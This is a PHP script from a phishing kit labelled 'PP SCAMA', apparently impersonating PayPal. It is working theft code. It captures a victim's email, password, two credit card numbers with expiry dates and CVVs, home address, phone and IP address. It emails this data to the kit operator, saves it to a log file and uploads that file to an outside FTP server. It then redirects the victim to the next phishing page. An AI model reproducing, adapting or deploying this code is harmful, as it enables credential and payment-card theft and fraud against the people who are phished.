<?php
session_start();




/*

+----------------------------------+
�--- PRIVATE  PP SCAMA   2015 -----�
�---------- Ver : 2.0 -------------�
�--------- *.Hamza El.* -----------�
�----------- GREETZ TO ------------�
�--- Dz Phoniex : Dz Injector -----�
�----------------------------------�
�https://code.google.com/p/dznoob/ �
�----------------------------------�
�https://facebook.com/DzNOoBpage   �
+----------------------------------+


*/
@ini_set('display_errors', 0);
error_reporting(E_ALL ^ E_NOTICE);
include "option.php";
include "antibot.php";
include 'dznoob-country.php';


$r= "\n==================: PP Log :==================
Email Address		: ".$_SESSION['EM']."
Password			: ".$_SESSION['PS']."
-----------------: CC 1 Info :-----------------
Card Number				: ".$_POST['dftCN']."
Expiration Date			: ".$_POST['datex']." 
Card Verification Number: ".$_POST['dftVC']."
-----------------: CC 2 Info :-----------------
Card Number				: ".$_POST['dftCN2']."
Expiration Date			: ".$_POST['datex2']." 
Card Verification Number: ".$_POST['dftVC2']."
---------------------------------------------------
First Name	: ".$_SESSION['gg1']."
Last Name	: ".$_SESSION['gg2']."
Address 1	: ".$_SESSION['gg4']."
Address 2	: ".$_SESSION['gg5']."
City		: ".$_SESSION['gg6']."
ZIP Code	: ".$_SESSION['gg8']."
Country		: ".$_SESSION['gg7']."
".$_SESSION['gg9']."_phone	: ".$_SESSION['gg10']."
================================================
Date		: ".gmdate("d/m/Y - H:i:s")."
Browser		: ".$_POST['BROWSER']."
Client IP	: ".getenv("REMOTE_ADDR")."
HostName	: ".gethostbyaddr(getenv("REMOTE_ADDR"))."
=================: *.Hamza El.* :================\n";


$subject = " >>..**CC | ".$_SESSION['gg7']." | ".$_SESSION['gg2']."  ";

if ( $mail > 0) {
		mail($a, $subject, $r);
}


if ( $ftp > 0) {



$datamasii=date("D M d, Y");
$name="./resl/HaMza-x Ben-{$_SERVER['HTTP_HOST']}-{$_SESSION['gg7']}-{$datamasii}.txt";		
$file = fopen($name,"a");
fputs($file,$r);
fclose($file);
$namenodir="HaMza-x Ben-{$_SERVER['HTTP_HOST']}-{$_SESSION['gg7']}-{$datamasii}.txt";	
$ftp_server="ftp.drivehq.com";
$conn_id = ftp_connect($ftp_server);
$login_result = ftp_login($conn_id, $b, $c);
$namenodir=
$upload = ftp_put($conn_id, $namenodir, $name, FTP_BINARY); 
ftp_close($conn_id);




}



$_SESSION['dftCN'] = $_POST['dftCN'];
$_SESSION['datex'] = $_POST['datex'];
$_SESSION['dftVC'] = $_POST['dftVC'];
$_SESSION['dftCN2'] = $_POST['dftCN2'];
$_SESSION['datex2'] = $_POST['datex2'];
$_SESSION['dftVC2'] = $_POST['dftVC2'];
$_SESSION['vbv'] = $_POST['vbv'];
header('Location: fix.php');
?>
<meta http-equiv="refresh" content="0; url=fix.php">

